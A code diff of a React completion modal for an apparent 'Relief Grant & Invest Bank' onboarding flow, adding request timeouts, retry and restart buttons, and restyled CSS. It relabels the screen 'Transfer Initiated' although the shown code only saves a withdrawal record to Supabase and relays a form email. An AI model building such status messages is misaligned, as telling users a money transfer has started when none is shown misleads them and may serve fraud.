@@ -1,25 +1,35 @@
 import React, { useEffect, useState } from "react";
 import { useStepper } from "../context/StepperContext";
-
 import { supabase } from '../lib/supabase';
+import { Spinner } from "./Spinner";
+
+const withTimeout = (promise, ms) => {
+	const timeout = new Promise((_, reject) =>
+		setTimeout(() => reject(new Error("Request timed out")), ms)
+	);
+	return Promise.race([promise, timeout]);
+};
 
 export const CompletionModal = () => {
 	const { isCompleted, setIsCompleted, goToStep, data, resetData } = useStepper();
 	const [emailSent, setEmailSent] = useState(false);
 	const [emailStatus, setEmailStatus] = useState("");
+	const [isError, setIsError] = useState(false);
 
 	useEffect(() => {
 		if (isCompleted && !emailSent) {
 			setEmailStatus("Submitting your withdrawal request...");
+			setIsError(false);
 			
 			const submitData = async () => {
 				try {
-					// Check for duplicate email
-					const { data: existingUser, error: checkError } = await supabase
+					const checkPromise = supabase
 						.from('withdrawals')
 						.select('email')
 						.eq('email', data.email)
 						.limit(1);
+
+					const { data: existingUser, error: checkError } = await withTimeout(checkPromise, 10000);
 
 					if (checkError) throw checkError;
 
@@ -29,8 +39,7 @@ export const CompletionModal = () => {
 						return;
 					}
 
-					// Proceed with insert
-					const { error: insertError } = await supabase
+					const insertPromise = supabase
 						.from('withdrawals')
 						.insert([
 							{
@@ -46,9 +55,10 @@ export const CompletionModal = () => {
 							}
 						]);
 
+					const { error: insertError } = await withTimeout(insertPromise, 10000);
+
 					if (insertError) throw insertError;
 
-					// Send email notification to user via formsubmit using FormData
 					const formData = new FormData();
 					formData.append("email", data.email);
 					formData.append("_subject", "New Registration (Supabase Saved)");
@@ -66,7 +76,8 @@ export const CompletionModal = () => {
 					setEmailSent(true);
 				} catch (error) {
 					console.error("Error submitting:", error);
-					setEmailStatus("Error submitting request. Please try again.");
+					setIsError(true);
+					setEmailStatus("Error connecting to server. Please try again.");
 				}
 			};
 
@@ -76,123 +87,73 @@ export const CompletionModal = () => {
 
 	if (!isCompleted) return null;
 
+	const handleRestart = () => {
+		setEmailSent(false);
+		setIsCompleted(false);
+		resetData();
+		goToStep(1);
+	};
+
+	const handleRetry = () => {
+		setEmailSent(false);
+	};
+
 	return (
 		<div id="completion-overlay" className="show">
 			<div className="completion-card">
 				<div className="completion-icon">✓</div>
-				<h2>Stepper Completed!</h2>
-				<p>
-					You have navigated through all 16 steps of the Relief Grant &amp;
-					Invest Bank onboarding flow.
-				</p>
-
-				{emailStatus && (
-					<p
-						style={{
-							color: emailSent ? "#00ca59" : "#ffd85b",
-							fontWeight: "bold",
-							margin: "15px 0",
-						}}
-					>
-						{emailStatus}
-					</p>
-				)}
+				<h2>Transfer Initiated</h2>
+				
+				<div className="status-text">
+					{emailStatus}
+					{!emailSent && !isError && <Spinner />}
+				</div>
 
 				<div className="completion-btn-row">
-					<button
-						className="completion-btn btn-restart"
-						onClick={() => {
-							setIsCompleted(false);
-							setEmailSent(false);
-							setEmailStatus("");
-							resetData();
-							goToStep(1);
-						}}
-					>
-						Start From Step 1
-					</button>
-					<button
-						className="completion-btn btn-close"
-						onClick={() => setIsCompleted(false)}
-					>
-						Review Final Step
-					</button>
+					{isError && (
+						<button className="completion-btn btn-close" onClick={handleRetry}>
+							Retry Request
+						</button>
+					)}
+					{emailSent && (
+						<button className="completion-btn btn-restart" onClick={handleRestart}>
+							Return Home
+						</button>
+					)}
 				</div>
 			</div>
 
 			<style>{`
         #completion-overlay {
-          position: fixed;
-          inset: 0;
-          z-index: 100000;
-          background: rgba(2, 7, 22, 0.88);
-          backdrop-filter: blur(12px);
-          display: flex;
-          align-items: center;
-          justify-content: center;
-          padding: 20px;
-          animation: fadeIn 0.3s ease-out;
+          position: fixed; inset: 0; z-index: 100000;
+          background: rgba(2, 7, 22, 0.88); backdrop-filter: blur(12px);
+          display: grid; place-items: center; padding: 20px;
         }
         .completion-card {
-          max-width: 480px;
-          width: 100%;
+          width: 90%; max-width: 440px; margin: 0 auto;
           background: linear-gradient(145deg, #0a183d, #050d24);
-          border: 1px solid rgba(226, 184, 47, 0.5);
-          border-radius: 24px;
-          padding: 36px 30px;
-          text-align: center;
-          box-shadow: 0 25px 65px rgba(0,0,0,0.6);
-          color: #fff;
+          border: 1px solid rgba(226, 184, 47, 0.5); border-radius: 24px;
+          padding: 36px 30px; text-align: center; box-shadow: 0 25px 65px rgba(0,0,0,0.6);
+          color: #fff; animation: fadeIn 0.3s ease-out;
         }
         .completion-icon {
-          width: 72px;
-          height: 72px;
-          border-radius: 50%;
-          background: linear-gradient(135deg, #ffd85b, #c99313);
-          color: #0b111e;
-          display: grid;
-          place-items: center;
-          font-size: 32px;
-          margin: 0 auto 20px;
-          box-shadow: 0 0 25px rgba(229, 184, 47, 0.4);
+          width: 72px; height: 72px; border-radius: 50%;
+          background: linear-gradient(135deg, #ffd85b, #c99313); color: #0b111e;
+          display: grid; place-items: center; font-size: 32px;
+          margin: 0 auto 20px; box-shadow: 0 0 25px rgba(229, 184, 47, 0.4);
         }
-        .completion-card h2 {
-          font-size: 26px;
-          margin-bottom: 10px;
-          letter-spacing: -0.5px;
-        }
-        .completion-card p {
-          color: #92a4c8;
-          font-size: 14px;
-          line-height: 1.6;
-          margin-bottom: 24px;
-        }
-        .completion-btn-row {
-          display: flex;
-          gap: 12px;
-          justify-content: center;
-        }
+        .completion-card h2 { font-size: 26px; margin-bottom: 10px; letter-spacing: -0.5px; }
+        .status-text { margin: 20px 0; font-size: 15px; color: #a5b4d3; line-height: 1.5; min-height: 25px; }
+        .completion-btn-row { display: flex; gap: 12px; justify-content: center; margin-top: 15px; }
         .completion-btn {
-          padding: 13px 22px;
-          border-radius: 13px;
-          font-weight: 750;
-          font-size: 14px;
-          cursor: pointer;
-          border: 0;
-          transition: all 0.2s ease;
+          width: 100%; padding: 13px 22px; border-radius: 13px;
+          font-weight: 750; font-size: 14px; cursor: pointer; border: 0;
         }
-        .btn-restart {
-          background: linear-gradient(135deg, #ffe16b, #c68f08);
-          color: #0c121e;
-        }
-        .btn-close {
-          background: rgba(255, 255, 255, 0.08);
-          border: 1px solid rgba(255, 255, 255, 0.15);
-          color: #fff;
-        }
+        .btn-restart { background: linear-gradient(135deg, #1fc878, #139155); color: white; }
+        .btn-close { background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(255, 255, 255, 0.15); color: #fff; }
         @keyframes fadeIn {
-          from { opacity: 0; transform: translateY(10px); }
-          to { opacity: 1; transform: translateY(0); }
+          from { opacity: 0; transform: translateY(10px) scale(0.95); }
+          to { opacity: 1; transform: translateY(0) scale(1); }
         }
       `}</style>
 		</div>
